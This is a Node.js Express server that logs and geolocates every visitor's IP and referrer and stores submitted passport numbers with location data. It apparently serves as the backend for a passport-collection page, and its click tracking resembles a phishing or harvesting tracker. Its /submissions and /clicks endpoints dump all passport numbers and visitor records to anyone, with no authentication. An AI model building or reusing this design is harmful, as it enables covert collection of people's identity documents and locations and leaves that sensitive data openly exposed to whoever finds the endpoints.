const express = require('express');
const sqlite3 = require('sqlite3');
const path = require('path');
const fetch = require('node-fetch'); // For server-side location lookup

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static('public')); // Serve static files from 'public' folder

// Database setup
const db = new sqlite3.Database('data.db', (err) => {
    if (err) console.error(err);
    console.log('Connected to database');
});

// Create tables
db.run(`CREATE TABLE IF NOT EXISTS submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    passport TEXT,
    ip TEXT,
    city TEXT,
    region TEXT,
    country TEXT,
    latitude REAL,
    longitude REAL,
    timestamp TEXT
)`);

db.run(`CREATE TABLE IF NOT EXISTS clicks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    referrer TEXT,
    city TEXT,
    country TEXT,
    timestamp TEXT
)`);

// Middleware to track clicks on every visit to "/"
app.use('/', async (req, res, next) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const referrer = req.headers['referer'] || 'Direct';

    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const locationData = await response.json();

        db.run(`INSERT INTO clicks (ip, referrer, city, country, timestamp) 
                VALUES (?, ?, ?, ?, ?)`,
            [
                ip,
                referrer,
                locationData.city || 'Unknown',
                locationData.country_name || 'Unknown',
                new Date().toISOString()
            ],
            (err) => {
                if (err) console.error('Error saving click:', err);
            });
    } catch (error) {
        console.error('Error fetching location:', error);
    }
    next(); // Proceed to serve the page
});

// Endpoint to save passport submissions
app.post('/save', (req, res) => {
    const { passport, ip, location, timestamp } = req.body;

    // Server-side validation: passport is mandatory
    if (!passport || passport.trim() === '') {
        return res.status(400).send('Passport number is required');
    }

    db.run(`INSERT INTO submissions 
        (passport, ip, city, region, country, latitude, longitude, timestamp) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
        [
            passport,
            ip,
            location.city || 'Unknown',
            location.region || 'Unknown',
            location.country || 'Unknown',
            location.latitude || null,
            location.longitude || null,
            timestamp
        ],
        (err) => {
            if (err) {
                console.error(err);
                res.status(500).send('Error saving data');
            } else {
                res.status(200).send('Data saved');
            }
        });
});

// Endpoint to view submissions
app.get('/submissions', (req, res) => {
    db.all('SELECT * FROM submissions', [], (err, rows) => {
        if (err) {
            res.status(500).send('Error retrieving data');
        } else {
            res.json(rows);
        }
    });
});

// Endpoint to view clicks
app.get('/clicks', (req, res) => {
    db.all('SELECT * FROM clicks', [], (err, rows) => {
        if (err) {
            res.status(500).send('Error retrieving clicks');
        } else {
            res.json(rows);
        }
    });
});

// Start the server
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});